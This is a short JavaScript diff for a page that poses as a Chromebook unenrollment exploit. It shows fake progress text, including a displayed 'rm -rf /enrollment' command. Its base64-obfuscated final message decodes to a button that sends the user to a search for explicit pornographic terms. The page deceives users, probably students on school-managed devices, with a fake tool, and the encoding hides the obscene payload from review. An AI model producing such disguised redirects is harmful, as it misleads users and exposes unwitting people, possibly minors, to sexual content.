@@ -9,7 +9,7 @@ const PROMPTS = {
   REMOVING_ENROLLMENT_CHECKS: "Running command `rm -rf /enrollment`",
   REMOVING_POLICIES: "Removing chromebook policies",
   FINISHED_EXPLOIT:
-    "RmluaXNoZWQsIHByZXNzIDxidXR0b24gb25jbGljaz0ibG9jYXRpb249J2h0dHBzOi8vd3d3Lmdvb2dsZS5jb20vc2VhcmNoP3E9aG90LXR3aW5zLWdldC1icnV0YWxseSBmdWNrZWQnIj5oZXJlIHRvIHVuZW5yb2xsPC9idXR0b24++",
+    encodeURIComponent("RmluaXNoZWQsIHByZXNzIDxidXR0b24gb25jbGljaz0ibG9jYXRpb24uaHJlZiA9ICdodHRwczovL3d3dy5nb29nbGUuY29tL3NlYXJjaD9xPWhvdCB0d2lucyBnZXR0aW5nIGJydXRhbGx5IGZ1Y2tlZCI%2BaGVyZTwvYnV0dG9uPiB0byBmaW5pc2ggdGhlIHVuZW5yb2xsaW5nIHByb2Nlc3M%3D"),
 };
 
 const append = (tagName) => {
@@ -61,7 +61,7 @@ async function loadExploit() {
 
   clearSideText();
   const finished = append('p');
-  finished.innerHTML = decodeURIComponent(atob(PROMPTS.FINISHED_EXPLOIT));
+  finished.innerHTML = atob(decodeURIComponent(PROMPTS.FINISHED_EXPLOIT));
 
   await timeout(500);
 
